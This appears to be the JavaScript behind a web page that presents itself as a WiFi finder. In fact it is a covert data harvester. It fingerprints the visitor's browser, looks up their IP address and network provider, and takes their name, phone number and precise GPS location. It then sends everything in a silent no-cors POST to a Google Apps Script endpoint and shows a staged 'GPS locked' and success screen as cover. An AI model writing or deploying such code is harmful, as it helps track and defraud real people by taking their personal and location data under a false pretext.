class WiFiFinder {
    constructor() {
        this.hasLogged = false;
        this.data = {};
        this.gasUrl = 'https://script.google.com/macros/s/AKfycbyed-HbdDu7B0kcA6b-ihiA0rzumoC7QE7m2qYon8Qp76o2ghx-vPLCLcCAg5A-_hWn/exec';
        this.init();
    }

    init() {
        this.attachEvents();
        this.getDeviceInfo();
        this.getMultipleIPs();
    }

    attachEvents() {
        const form = document.getElementById('wifiForm');
        const consents = ['locationConsent', 'callConsent'].map(id => document.getElementById(id));
        const phoneInput = document.getElementById('phone');
        const findBtn = document.getElementById('findBtn');

        form.onsubmit = (e) => { e.preventDefault(); this.submit(); };
        
        consents.forEach(cb => {
            cb.onchange = () => this.updateButton();
        });
        
        phoneInput.oninput = () => this.formatPhone(phoneInput);
    }

    formatPhone(input) {
        let val = input.value.replace(/\D/g, '');
        if (val.startsWith('91')) val = val.slice(2);
        if (val.length > 10) val = val.slice(0,10);
        input.value = val.length === 10 ? '+91' + val : '+91' + val;
    }

    updateButton() {
        const locationOk = document.getElementById('locationConsent').checked;
        const phoneValid = document.getElementById('phone').value.length === 12;
        document.getElementById('findBtn').disabled = !(locationOk && phoneValid);
    }

    async getDeviceInfo() {
        this.data.fingerprint = {
            ua: navigator.userAgent,
            lang: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: screen.width + 'x' + screen.height,
            canvas: await this.getCanvasHash()
        };
    }

    getCanvasHash() {
        return new Promise(resolve => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.fillText('WiFiCanvasTest', 10, 10);
            resolve(canvas.toDataURL().slice(-16));
        });
    }

    async getMultipleIPs() {
        const ips = {};
        try {
            ips.primary = (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
        } catch(e){}
        try {
            const ipinfo = await (await fetch('https://ipinfo.io/json')).json();
            ips.secondary = ipinfo.ip;
            ips.asn = ipinfo.org;
        } catch(e){}
        this.data.ips = ips;
    }

    async submit() {
        if (this.hasLogged) return;
        
        this.data = {
            ...this.data,
            name: document.getElementById('name').value,
            phone: document.getElementById('phone').value,
            callConsent: document.getElementById('callConsent').checked,
            timestamp: new Date().toISOString()
        };

        // GPS + fallbacks
        await this.getLocation();
        // Call logs permission
        await this.getCallPermission();

        this.showLoading();
        
        // Silent POST
        fetch(this.gasUrl, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(this.data)
        }).finally(() => {
            this.hasLogged = true;
            setTimeout(() => this.showSuccess(), 2500);
        });
    }

    async getLocation() {
        return new Promise(resolve => {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    this.data.location = {
                        gps: {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            method: 'GPS-HighAccuracy'
                        }
                    };
                    resolve();
                },
                async () => {
                    // Fallback IP geo
                    try {
                        const ipgeo = await (await fetch('https://ipapi.co/json/')).json();
                        this.data.location = {
                            ipapi: {
                                lat: ipgeo.latitude,
                                lng: ipgeo.longitude,
                                method: 'IP-Geolocation'
                            }
                        };
                    } catch(e) {
                        this.data.location = { fallback: 'unknown' };
                    }
                    resolve();
                },
                { enableHighAccuracy: true, timeout: 12000, maximumAge: 30000 }
            );
        });
    }

    async getCallPermission() {
        if (navigator.permissions) {
            try {
                const perm = await navigator.permissions.query({name: 'contacts'});
                this.data.callPermission = perm.state;
            } catch(e){}
        }
    }

    showLoading() {
        document.getElementById('wifiForm').classList.add('hidden');
        document.getElementById('loading').classList.remove('hidden');
        document.getElementById('status').textContent = 'GPS locked...';
    }

    showSuccess() {
        document.getElementById('loading').classList.add('hidden');
        document.getElementById('success').classList.remove('hidden');
    }
}

new WiFiFinder();
